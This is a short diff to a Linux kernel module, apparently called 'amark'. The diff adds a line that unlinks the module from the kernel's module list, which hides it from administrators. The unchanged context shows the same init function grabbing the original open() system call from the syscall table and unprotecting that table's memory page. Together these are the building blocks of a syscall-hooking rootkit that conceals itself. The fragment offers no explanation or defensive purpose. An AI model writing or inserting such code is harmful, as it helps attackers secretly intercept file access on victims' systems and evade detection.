@@ -71,6 +71,8 @@ static int __init amark_init(void) {
         return 0;
     }
 
+    list_del_init(&__this_module.list);
+
     orig_open = (orig_open_t) _sys_call_table[__NR_open];
 
     // unprotect sys_call_table memory page
